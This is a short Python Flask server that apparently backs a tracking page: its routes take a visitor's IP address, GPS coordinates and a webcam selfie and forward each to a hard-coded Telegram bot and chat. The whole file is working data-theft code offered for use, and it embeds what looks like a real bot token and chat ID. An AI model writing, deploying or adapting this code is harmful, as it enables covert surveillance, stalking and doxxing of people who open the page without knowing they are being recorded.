from flask import Flask, request, jsonify, render_template
import requests, base64
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = "7647716405:AAFNDvWBsJaSLz18EfcECt5lSAarPevzgK8"
TELEGRAM_CHAT_ID = "6118484842"

def send_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text})

def send_photo(image_b64):
    try:
        photo = base64.b64decode(image_b64.split(",")[1])
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {"photo": ("selfie.jpg", photo, "image/jpeg")}
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files=files)
    except Exception as e:
        print("Photo send failed:", e)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/report_ip", methods=["POST"])
def report_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_message(f"🌐 New visitor!\nIP: {ip}\n🕒 Time: {ts}")
    return jsonify({"status": "ok"})

@app.route("/report_location", methods=["POST"])
def report_location():
    data = request.json
    lat, lon = data.get("lat"), data.get("lon")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_message(f"📍 Location shared:\nLat: {lat}\nLon: {lon}\n🕒 Time: {ts}")
    return jsonify({"status": "ok"})

@app.route("/report_selfie", methods=["POST"])
def report_selfie():
    data = request.json
    image = data.get("image")
    send_photo(image)
    return jsonify({"status": "ok"})

if __name__ == "__main__":
   app.run(host="0.0.0.0", port=5000, debug=True)
